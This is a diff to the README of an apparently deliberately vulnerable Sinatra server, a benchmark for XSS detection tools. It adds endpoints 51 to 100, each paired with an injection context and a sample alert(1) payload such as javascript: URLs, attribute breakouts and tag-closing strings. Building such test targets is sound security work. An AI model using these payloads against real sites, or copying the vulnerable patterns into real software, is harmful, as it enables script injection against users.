@@ -4,7 +4,7 @@ A Sinatra-based XSS vulnerability benchmark server for testing XSS detection too
 
 ## Overview
 
-This server provides 50 different XSS vulnerable endpoints, each demonstrating a different XSS injection context. All endpoints use the GET method and accept a `query` parameter.
+This server provides 100 different XSS vulnerable endpoints, each demonstrating a different XSS injection context. All endpoints use the GET method and accept a `query` parameter.
 
 ## Installation
 
@@ -74,6 +74,56 @@ The server will start on `http://0.0.0.0:3000`.
 | GET /48?query= | autofocus onfocus | `');alert(1);//` |
 | GET /49?query= | JSON context | `"};alert(1);//` |
 | GET /50?query= | noscript tag | `</noscript><script>alert(1)</script>` |
+| GET /51?query= | URL fragment (DOM XSS) | `<img src=x onerror=alert(1)>` |
+| GET /52?query= | window.name (DOM XSS) | `<img src=x onerror=alert(1)>` |
+| GET /53?query= | location.search (DOM XSS) | `<img src=x onerror=alert(1)>` |
+| GET /54?query= | CSS @import url | `);@import url(javascript:alert(1))` |
+| GET /55?query= | setTimeout string | `");alert(1);//` |
+| GET /56?query= | setInterval string | `");alert(1);//` |
+| GET /57?query= | eval context | `");alert(1);//` |
+| GET /58?query= | Function constructor | `");alert(1);//` |
+| GET /59?query= | postMessage handler | `<img src=x onerror=alert(1)>` |
+| GET /60?query= | document.cookie | `';alert(1);//` |
+| GET /61?query= | localStorage | `';alert(1);</script><script>alert(1)//` |
+| GET /62?query= | sessionStorage | `';alert(1);</script><script>alert(1)//` |
+| GET /63?query= | XMLHttpRequest open URL | `javascript:alert(1)` |
+| GET /64?query= | fetch URL | `javascript:alert(1)` |
+| GET /65?query= | Worker URL | `data:text/javascript,alert(1)` |
+| GET /66?query= | SharedWorker URL | `data:text/javascript,alert(1)` |
+| GET /67?query= | aria-label attribute | `" onclick="alert(1)` |
+| GET /68?query= | input placeholder | `" onfocus="alert(1)" autofocus="` |
+| GET /69?query= | img alt attribute | `" onerror="alert(1)` |
+| GET /70?query= | button type attribute | `submit" onclick="alert(1)` |
+| GET /71?query= | input type attribute | `text" onfocus="alert(1)" autofocus="` |
+| GET /72?query= | body background (legacy) | `javascript:alert(1)` |
+| GET /73?query= | table background (legacy) | `javascript:alert(1)` |
+| GET /74?query= | td background (legacy) | `javascript:alert(1)` |
+| GET /75?query= | bgsound src (legacy IE) | `javascript:alert(1)` |
+| GET /76?query= | layer src (legacy) | `javascript:alert(1)` |
+| GET /77?query= | input formmethod | `GET" onclick="alert(1)` |
+| GET /78?query= | input formenctype | `text/plain" onclick="alert(1)` |
+| GET /79?query= | input formtarget | `_blank" onclick="alert(1)` |
+| GET /80?query= | a target attribute | `_blank" onclick="alert(1)` |
+| GET /81?query= | a download attribute | `test" onclick="alert(1)` |
+| GET /82?query= | area href | `javascript:alert(1)` |
+| GET /83?query= | blockquote cite | `" onclick="alert(1)` |
+| GET /84?query= | q cite attribute | `" onclick="alert(1)` |
+| GET /85?query= | ins cite attribute | `" onclick="alert(1)` |
+| GET /86?query= | del cite attribute | `" onclick="alert(1)` |
+| GET /87?query= | applet codebase (legacy) | `javascript:alert(1)` |
+| GET /88?query= | applet code (legacy) | `javascript:alert(1)` |
+| GET /89?query= | object codebase | `javascript:alert(1)` |
+| GET /90?query= | object classid | `javascript:alert(1)` |
+| GET /91?query= | param value | `javascript:alert(1)` |
+| GET /92?query= | XML data island | `</item></xml><script>alert(1)</script>` |
+| GET /93?query= | xmp tag (deprecated) | `</xmp><script>alert(1)</script>` |
+| GET /94?query= | listing tag (deprecated) | `</listing><script>alert(1)</script>` |
+| GET /95?query= | plaintext tag | N/A (renders all as text) |
+| GET /96?query= | isindex prompt (deprecated) | `" onclick="alert(1)` |
+| GET /97?query= | frameset onload (legacy) | `');alert(1);//` |
+| GET /98?query= | frame src (legacy) | `javascript:alert(1)` |
+| GET /99?query= | keygen autofocus (deprecated) | `');alert(1);//` |
+| GET /100?query= | menu item onclick | `');alert(1);//` |
 
 ## License
 
